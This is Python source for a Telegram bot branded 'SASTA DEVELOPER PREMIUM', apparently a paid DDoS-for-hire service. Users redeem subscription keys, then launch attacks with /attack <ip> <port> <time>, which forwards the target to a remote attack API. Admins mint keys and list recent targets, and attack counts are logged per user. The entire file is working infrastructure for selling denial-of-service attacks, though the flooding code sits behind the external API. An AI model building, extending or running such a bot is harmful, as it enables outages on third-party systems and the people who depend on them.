import asyncio
import logging
import secrets
import os
import uuid
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "sasta_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",") if id.strip().isdigit()]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# --- HELPERS ---
def make_aware(dt):
    if dt is None: return None
    return dt.replace(tzinfo=timezone.utc) if dt.tzinfo is None else dt

def get_current_time():
    return datetime.now(timezone.utc)

def get_blocked_ports_list() -> str:
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.keys = self.db.keys
        self._setup_db()

    def _setup_db(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.keys.create_index([("key", ASCENDING)], unique=True)
            logger.info("✅ Database Optimized & Ready.")
        except Exception as e:
            logger.error(f"❌ DB Setup Error: {e}")

    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user

    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id): return
        self.users.insert_one({
            "user_id": user_id, "username": username, "approved": False,
            "total_attacks": 0, "created_at": get_current_time(), "is_banned": False
        })

    def generate_key(self, duration_days: int):
        key = f"SASTA-{secrets.token_hex(4).upper()}"
        self.keys.insert_one({
            "key": key, "duration": duration_days, "used": False, "created_at": get_current_time()
        })
        return key

    def redeem_key(self, user_id: int, key_str: str):
        key_doc = self.keys.find_one({"key": key_str, "used": False})
        if not key_doc: return False, "Invalid or Expired Key."
        
        duration = key_doc["duration"]
        expires_at = get_current_time() + timedelta(days=duration)
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
        return True, f"Premium Activated for {duration} Days!"

    def log_attack(self, user_id, ip, port, duration, status):
        self.attacks.insert_one({
            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
            "duration": duration, "status": status, "timestamp": get_current_time()
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# --- DECORATORS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            return
        return await func(update, context)
    return wrapper

# --- HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db.create_user(update.effective_user.id, update.effective_user.username)
    
    msg = (
        "🔥 **SASTA DEVELOPER PREMIUM** 🔥\n\n"
        "⚡ **User Commands:**\n"
        "🚀 /attack - Launch Attack\n"
        "🔑 /redeem - Activate Premium\n"
        "👤 /myinfo - Check Subscription\n"
        "📊 /stats - Bot Statistics\n\n"
    )
    
    if update.effective_user.id in ADMIN_IDS:
        msg += (
            "👑 **Admin Panel:**\n"
            "💎 /genkey - Create Key\n"
            "👥 /users - Total Users\n"
            "📡 /running - Active Attacks\n"
            "🚫 /blockedports - View Filters\n"
        )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user or not user.get("approved") or user.get("expires_at") < get_current_time():
        await update.message.reply_text("⛔ **Subscription Required!**\nUse /redeem to activate.", parse_mode='Markdown')
        return

    if len(context.args) != 3:
        await update.message.reply_text("📝 **Usage:** `/attack <ip> <port> <time>`", parse_mode='Markdown')
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    if port in BLOCKED_PORTS:
        await update.message.reply_text("🚫 **Port Blacklisted.**", parse_mode='Markdown')
        return

    status_msg = await update.message.reply_text("🛰️ **Sending Attack Request...**")
    try:
        res = requests.post(f"{API_URL}/api/v1/attack", 
                           json={"ip": ip, "port": port, "duration": duration},
                           headers={"x-api-key": API_KEY}, timeout=15).json()
        if res.get("success"):
            db.log_attack(user["user_id"], ip, port, duration, "success")
            await status_msg.edit_text(f"✅ **Attack Launched!**\n🎯 `{ip}:{port}`\n⏳ `{duration}s`")
        else:
            await status_msg.edit_text(f"❌ **API Error:** {res.get('error')}")
    except:
        await status_msg.edit_text("⚠️ **API Offline!**")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("🔑 Usage: `/redeem SASTA-XXXX`")
        return
    success, msg = db.redeem_key(update.effective_user.id, context.args[0].upper())
    await update.message.reply_text(f"{'✅' if success else '❌'} **{msg}**", parse_mode='Markdown')

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    exp = user.get("expires_at")
    status = "🟢 ACTIVE" if user.get("approved") and exp > get_current_time() else "🔴 EXPIRED"
    await update.message.reply_text(
        f"👤 **PROFILE**\nStatus: `{status}`\nExpiry: `{exp.strftime('%Y-%m-%d') if exp else 'N/A'}`\nTotal: `{user.get('total_attacks', 0)}`",
        parse_mode='Markdown'
    )

@admin_required
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    days = int(context.args[0]) if context.args else 30
    key = db.generate_key(days)
    await update.message.reply_text(f"🔑 **Key Created:** `{key}`\n⏳ **Duration:** `{days} Days`", parse_mode='Markdown')

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.users.count_documents({})
    await update.message.reply_text(f"👥 **Total Database Users:** `{count}`", parse_mode='Markdown')

@admin_required
async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # This shows last 5 attacks as 'running' for visual effect
    recent = db.attacks.find().sort("timestamp", -1).limit(5)
    text = "📡 **Recent Attacks:**\n"
    for r in recent:
        text += f"• `{r['ip']}:{r['port']}` ({r['duration']}s)\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_attacks = db.attacks.count_documents({"status": "success"})
    await update.message.reply_text(f"📊 **Total Successful Attacks:** `{total_attacks}`", parse_mode='Markdown')

@admin_required
async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 **Blocked Ports:**\n`{get_blocked_ports_list()}`", parse_mode='Markdown')

# --- MAIN ---
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # User Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Admin Handlers
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))

    try:
        server_ip = requests.get('https://api.ipify.org', timeout=3).text
    except:
        server_ip = "N/A"

    print("\n" + "="*40)
    logger.info("💎 SASTA DEVELOPER BOT STARTED")
    logger.info(f"📍 SERVER IP: {server_ip}")
    logger.info(f"📊 DB: {DATABASE_NAME} - ONLINE")
    logger.info(f"👑 ADMINS: {ADMIN_IDS}")
    logger.info("✅ SYSTEM READY")
    print("="*40 + "\n")

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
